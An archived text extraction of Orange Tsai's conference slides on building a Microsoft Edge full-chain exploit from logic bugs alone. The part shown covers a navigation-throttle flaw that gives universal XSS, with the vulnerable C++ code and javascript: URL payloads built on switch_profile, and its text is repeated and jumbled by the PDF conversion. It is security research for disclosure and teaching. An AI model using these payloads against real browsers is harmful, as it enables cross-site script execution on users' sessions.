---
type: Whitepaper
title: The Last Proof of Human Craft (Slides)
description: "Slides explain a logic-only Edge chain: sourceless browser navigation creates UXSS, popup and origin exceptions remove prerequisites, and privileged reader APIs expose a file write used to alter protocol-handler launch behavior."
resource: "https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf"
tags: [whitepaper, webseclist-reference, en, orange-tsai, browser, xss, sandbox-escape, file-write, attack-chain, rce, owasp-a03-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-29T11:55:18+00:00"
verified:
  - by: AI archive validation
    at: 2026-10-29
status: stable
stale_after: 2027-10-29
sources:
  - id: original
    resource: "https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf"
    title: The Last Proof of Human Craft (Slides)
    author: Orange Tsai
also_at: []
authors:
  - Orange Tsai
canonical_url: ""
cited_by:
  - "2026-ai.md:411"
commit: ""
content_sha256: 1805416b173e9418912587d233e27c51563d2e84f62c5c9418687303955bdbf9
depth: full
depth_reason: default
kind: whitepaper
language: en
licence: unknown
original_url: "https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf"
published: ""
publisher: Orange Tsai
publisher_english: ""
raw_sha256: 804250479a83976d866637d25f872cfb1686232c49f133ae118f53bd02bcf8ed
retrieved_from: "https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf"
retrieved_kind: live
retrieved_utc: "2026-10-29T11:55:18+00:00"
slug: orange-tsai-last-proof-human-craft-slides
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# The Last Proof of Human Craft (Slides)

**The Last Proof of Human Craft (Slides)** - Orange Tsai, Orange Tsai.

- Published: date not stated
- Original: <https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf>
- Preserved from: https://raw.githubusercontent.com/orangetw/My-Presentation-Slides/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf (live) on 2026-10-29
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

The Last Proof of
Human Craft:
Forging Microsoft Edge Full Chain with Logic Bugs Only!

  Orange Tsai
Is it still hard to break Browser
            in 2026?
   Target                Escape Options               Prize     MoP
                        N/A – Renderer Only          $75,000    7.5

Google Chrome           Windows Kernel EoP           $125,000   12.5

                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only          $75,000    7.5
Microsoft Edge
                        Windows Kernel EoP           $125,000   12.5
 (Chromium)
                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only          $75,000    7.5

 Apple Safari             Sandbox Escape             $125,000   12.5

                         macOS Kernel EoP            $175,000   17.5

                        N/A – Renderer Only          $50,000     5
Mozilla Firefox
                  SBX Escape or Windows Kernel EoP   $100,000   10
                                                                Attempts
   Target                Escape Options               Prize       MoP
                                                                   0
                        N/A – Renderer Only          $75,000       7.5
                                                                   0
Google Chrome           Windows Kernel EoP           $125,000     12.5
                                                                   0
                          Sandbox Escape             $175,000     17.5
                                                                   0
                        N/A – Renderer Only          $75,000       7.5
Microsoft Edge                                                     0
                        Windows Kernel EoP           $125,000     12.5
 (Chromium)
                          Sandbox Escape             $175,000      1
                                                                  17.5

                        N/A – Renderer Only          $75,000       2
                                                                   7.5

 Apple Safari             Sandbox Escape             $125,000      0
                                                                  12.5

                         macOS Kernel EoP            $175,000      0
                                                                  17.5

                        N/A – Renderer Only          $50,000       35
Mozilla Firefox
                  SBX Escape or Windows Kernel EoP   $100,000      10
                                                                   0
                                                                PWNED
   Target                Escape Options               Prize      MoP
                        N/A – Renderer Only          $75,000
                                                                  -
                                                                 7.5

Google Chrome           Windows Kernel EoP           $125,000     -
                                                                 12.5

                          Sandbox Escape             $175,000     -
                                                                 17.5

                        N/A – Renderer Only          $75,000      -
                                                                 7.5
Microsoft Edge
                        Windows Kernel EoP           $125,000     -
                                                                 12.5
 (Chromium)
                          Sandbox Escape             $175,000     1
                                                                 17.5

                        N/A – Renderer Only          $75,000      -
                                                                 7.5

 Apple Safari             Sandbox Escape             $125,000     -
                                                                 12.5

                         macOS Kernel EoP            $175,000    17.5
                                                                  -
                        N/A – Renderer Only          $50,000      5
                                                                  -
Mozilla Firefox
                  SBX Escape or Windows Kernel EoP   $100,000     10
                                                                  -
So how far can LLMs go?
How far LLMs can go
？
✓ LEVEL 000 — Find Renderer bugs ?
How far LLMs can go
？
✓ LEVEL 000 — Find Renderer bugs ?
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
V8 SANDBOX
Full V8 Heap Sandbox AAR/AAW
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
？
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE ?
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE
COMPROMISED RENDERER PROCESS
   Target                Escape Options                Prize    MoP
                  N/A –N/ARenderer     Only
                           – Renderer Only           $75,000
                                                      $75,000   7.5
                                                                7.5

Google Chrome           Windows Kernel EoP           $125,000   12.5

                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only           $75,000   7.5
Microsoft Edge
                        Windows Kernel EoP           $125,000   12.5
 (Chromium)
                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only           $75,000   7.5

 Apple Safari             Sandbox Escape             $125,000   12.5

                         macOS Kernel EoP            $175,000   17.5

                        N/A – Renderer Only           $50,000    5
Mozilla Firefox
                  SBX Escape or Windows Kernel EoP   $100,000   10
                                BROWSER PROCESS




            Mojo IPC




BROWSER SANDBOX
 COMPROMISED RENDERER PROCESS
Browser
Sandbox




           Windows
          Kernel Bugs
   Target                Escape Options               Prize     MoP
                        N/A – Renderer Only          $75,000    7.5

Google Chrome     Windows   Kernel
                      Windows          EoP
                              Kernel EoP             $125,000
                                                     $125,000     12.5
                                                                12.5

                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only          $75,000    7.5
Microsoft Edge
                        Windows Kernel EoP           $125,000   12.5
 (Chromium)
                          Sandbox Escape             $175,000   17.5

                        N/A – Renderer Only          $75,000    7.5

 Apple Safari             Sandbox Escape             $125,000   12.5

                         macOS Kernel EoP            $175,000   17.5

                        N/A – Renderer Only          $50,000     5
Mozilla Firefox
                  SBX Escape or Windows Kernel EoP   $100,000   10
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE
？
✓ LEVEL 002 — Escape the Browser Sandbox for full-chain RCE ?
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE
✓ LEVEL 002 — Escape the Browser Sandbox for full-chain RCE
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE
✓ LEVEL 002 — Escape the Browser Sandbox for full-chain RCE
？
✓ LEVEL 003 — Do all of the above without memory corruption
How far LLMs can go
✓ LEVEL 000 — Find Renderer bugs
✓ LEVEL 001 — Bypass the V8 Sandbox for Renderer RCE
✓ LEVEL 002 — Escape the Browser Sandbox for full-chain RCE
✓ LEVEL 003 — Do all of the above without memory corruption
    Target                Escape Options               Prize     MoP
                         N/A – Renderer Only          $75,000     7.5

 Google Chrome           Windows Kernel EoP           $125,000   12.5
Google Chrome
                      Sandbox  Escape
                         Sandbox Escape               $175,000
                                                      $175,000   17.5
                                                                  17.5

                         N/A – Renderer Only          $75,000     7.5
 Microsoft Edge
Microsoft Edge           Windows Kernel EoP           $125,000   12.5
  (Chromium)
 (Chromium)              Sandbox Escape
                      Sandbox  Escape                 $175,000
                                                      $175,000    17.5
                                                                 17.5
                         N/A – Renderer Only          $75,000     7.5

  Apple Safari             Sandbox Escape             $125,000   12.5
 Apple Safari           macOS
                     macOS    Kernel EoP
                           Kernel    EoP              $175,000
                                                      $175,000    17.5
                                                                 17.5
                         N/A – Renderer Only          $50,000     5
 Mozilla Firefox
                   SBX Escape or Windows Kernel EoP   $100,000    10
Let me solo Chromium
Browser Navigation
• Hyperlink Clicks
• Client-Side Redirecting
• Server-Side Redirecting
• …
➔ https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit
                             Navigation Throttles

    Install                           T
                                                 Throttle


                              Hook

                                                                • PROCEED
                                                                • DEFER
• WillStartRequest                                              • CANCEL
                                              Return
• WillRedirectRequest
• WillFailRequest
• WillProcessResponse
• ...


    ➔ https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit
                     Install             Navigation Throttles
                                Throttle
                                     Throttle
                                          Throttle
                                               Throttle
                                                    Throttle
                                                        Throttle
Browser Navigation
                                             Hook

                                                                                   • PROCEED
                                                                                   • DEFER
                • WillStartRequest                                                 • CANCEL
                                            Return
                • WillRedirectRequest
                • WillFailRequest
              • • Safe Browsing
                   WillProcessResponse • HTTP-First Fallback
              • • Smart
                   ...  Screen         • HTTPS Certificate Error
              • Typosquatting                          • …

                       ➔ https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit
Can you spot the vulnerability?
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

   content::WebContents* web_contents = navigation_handle()->GetWebContents();
   const GURL last_committed_url = web_contents->GetLastCommittedURL();

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
   Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
        const GURL last_committed_url = web_contents->GetLastCommittedURL();
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
                                                                                  1
        // Some authority checks […]

        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;

        Navigate(&params);
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;
                                                                                  1
         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
Can you spot the vulnerability?
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

    content::WebContents* web_contents = navigation_handle()->GetWebContents();
    const GURL last_committed_url = web_contents->GetLastCommittedURL();

    if ( !IsSupportedLoginUrl(last_committed_url) )
        return content::NavigationThrottle::CANCEL_AND_IGNORE;

// Some
   // Some authority      checks
            authority checks […] […]
    const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)           2
    NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
    params.disposition = WindowOpenDisposition::CURRENT_TAB;
    params.window_action = NavigateParams::SHOW_WINDOW;

    Navigate(&params);
    Can you spot the vulnerability?
           Fixed Hostname

https://guidance-ca-error/?switch_profile=UNTRUSTED&[...]
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

         content::WebContents* web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();

         if ( !IsSupportedLoginUrl(last_committed_url) )
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]
   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition    = WindowOpenDisposition::CURRENT_TAB;
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action
        params.window_action== NavigateParams::SHOW_WINDOW;
                                NavigateParams::SHOW_WINDOW;

        Navigate(&params);
   Navigate(&params);
                                                                                       3
    Can you spot the vulnerability?
           Fixed Hostname

https://guidance-ca-error/?switch_profile=UNTRUSTED&[...]
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

         content::WebContents* web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();

         if ( !IsSupportedLoginUrl(last_committed_url) )
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]
   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition    = WindowOpenDisposition::CURRENT_TAB;
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action
        params.window_action== NavigateParams::SHOW_WINDOW;
                                NavigateParams::SHOW_WINDOW;

        Navigate(&params);
   Navigate(&params);
                                                                                       3
Can you    spot the vulnerability?
     https://login.live.com

ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

   content::WebContents* web_contents = navigation_handle()->GetWebContents();
   const GURL last_committed_url = web_contents->GetLastCommittedURL();

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
Can you    spot the vulnerability?
     https://login.live.com

    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);

➔
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
    location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
    switch_profile=javascript:alert(origin)//`
       Navigate(&params);
Can you    spot the vulnerability?
     https://login.live.com
                                                                     SELF-XSS
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

                login.live.com says
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();
                https://login.live.com
       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]                                 OK
       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);

➔
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
    location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
    switch_profile=javascript:alert(origin)//`
       Navigate(&params);
Can you    spot the vulnerability?
     https://login.live.com

    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);

➔
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
    location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
    switch_profile=edge://flags`
       Navigate(&params);
Can you   spot the vulnerability?
     edge://flags

ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

   content::WebContents* web_contents = navigation_handle()->GetWebContents();
   const GURL last_committed_url = web_contents->GetLastCommittedURL();

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
    Can you spot the vulnerability?
            Fixed Hostname

https://guidance-ca-error/?switch_profile=UNTRUSTED&[...]
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

         content::WebContents* web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();

         if ( !IsSupportedLoginUrl(last_committed_url) )
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]
   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition    = WindowOpenDisposition::CURRENT_TAB
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action
        params.window_action== NavigateParams::SHOW_WINDOW;
                                NavigateParams::SHOW_WINDOW;

        Navigate(&params);
   Navigate(&params);
chromium/chrome/browser/ui/
browser_navigator.cc
baseWeakPtr<content::NavigationHandle> Navigate(NavigateParams* params)
{

  if (!params->source_contents && params->browser) {
    params->source_contents = params->browser
         ->GetBrowserForMigrationOnly()
         ->tab_strip_model()
         ->GetActiveWebContents();
    }

    // […]

    if (params->disposition == WindowOpenDisposition::CURRENT_TAB) {
        contents_to_navigate_or_insert = params->source_contents;
    }
Can you    spot the vulnerability?
     https://login.live.com

    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)


➔
       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
    setTimeout(function(){
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
      location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
        switch_profile=javascript:alert(origin)//`
       Navigate(&params);
    }, 10000)
Can you    spot the vulnerability?
     https://login.live.com

    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
                   Switch to Another Tab?
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)


➔
       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
    setTimeout(function(){
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
      location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
        switch_profile=javascript:alert(origin)//`
       Navigate(&params);
    }, 10000)
www.google.com says
https://www.google.com


                  www.microsoft.com says      OK

                  https://www.microsoft.com
                                     www.icloud.com says
                                     https://www.icloud.com   OK

                                                                   OK
www.google.com 說
https://www.google.com



                 Universal XSS
                 Universal XSS
                  www.microsoft.com 說
                  https://www.microsoft.com
                                              確定

                                     www.icloud.com 說
                                     https://www.icloud.com   確定

                                                                   確定
Building a Microsoft Edge Full
Chain — 20%
• (Bug 1) – Browser-Initiated & Source-less Navigation → UXSS Primitive
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com                 Find Open Redirect
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com                           or XSS Here?
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                DEBUFF{ x
                          web_contents = navigation_handle()->GetWebContents();     1
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();
        Must fire from a trusted domain
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
Can you       spot the vulnerability?
     https://login.live.com


    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
                   Switch to Another Tab?
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
    setTimeout(function(){
➔
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
      location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
        switch_profile=javascript:alert(origin)//`
       Navigate(&params);
     }, 10000)
Can you       spot the vulnerability?
     https://login.live.com


    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
                                                                     DEBUFF x        2
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();
            Needs a manual tab switch
       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

       // Some authority checks […]

       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
    setTimeout(function(){
➔
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
      location   = `https://guidance-ca-error/31337?email=[...]&
       params.window_action = NavigateParams::SHOW_WINDOW;
        switch_profile=javascript:alert(origin)//`
       Navigate(&params);
     }, 10000)
           Profile* current_profile = Profile::FromBrowserContext(


The First Bug
                web_contents->GetBrowserContext());

           std::string email;
           net::GetValueForKeyInQuery(target_url, kEmailQueryKey, &email);

            const base::FilePath target_profile_path = GetPathOfProfileWithEmail(email);
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
            if (current_profile->GetPath() != target_profile_path) {     {
              profiles::SwitchToProfile(target_profile_path,
    content::WebContents*                                    false, BindOnce(…));
                          web_contents = navigation_handle()->GetWebContents();
            } last_committed_url = web_contents->GetLastCommittedURL();
    const GURL

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
           Profile* current_profile = Profile::FromBrowserContext(


The First Bug
                web_contents->GetBrowserContext());

           std::string email;
           net::GetValueForKeyInQuery(target_url, kEmailQueryKey, &email);

            const base::FilePath target_profile_path = GetPathOfProfileWithEmail(email);
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
            if (current_profile->GetPath()                       DEBUFF x
                                           != target_profile_path) {             3
              profiles::SwitchToProfile(target_profile_path,
    content::WebContents*                                    false, BindOnce(…));
                          web_contents = navigation_handle()->GetWebContents();
            } last_committed_url = web_contents->GetLastCommittedURL();
    const GURL
   Needs a signed -in user session
   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
           Profile* current_profile = Profile::FromBrowserContext(


The First Bug
                web_contents->GetBrowserContext());

           std::string email;
           net::GetValueForKeyInQuery(target_url, kEmailQueryKey, &email);

            const base::FilePath target_profile_path = GetPathOfProfileWithEmail(email);
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
            if (current_profile->GetPath() != target_profile_path) {     {
              profiles::SwitchToProfile(target_profile_path,
    content::WebContents*                                    false, BindOnce(…));
                          web_contents = navigation_handle()->GetWebContents();
            } last_committed_url = web_contents->GetLastCommittedURL();
    const GURL

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
           Profile* current_profile = Profile::FromBrowserContext(


The First Bug
                web_contents->GetBrowserContext());

           std::string email;
           net::GetValueForKeyInQuery(target_url, kEmailQueryKey, &email);

            const base::FilePath target_profile_path = GetPathOfProfileWithEmail(email);
ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
            if (current_profile->GetPath()                       DEBUFF x
                                           != target_profile_path) {             4
              profiles::SwitchToProfile(target_profile_path,
    content::WebContents*                                    false, BindOnce(…));
                          web_contents = navigation_handle()->GetWebContents();
            } last_committed_url = web_contents->GetLastCommittedURL();
    const GURL
  Must know the login email first
   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
                                                                     BYPASSING
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
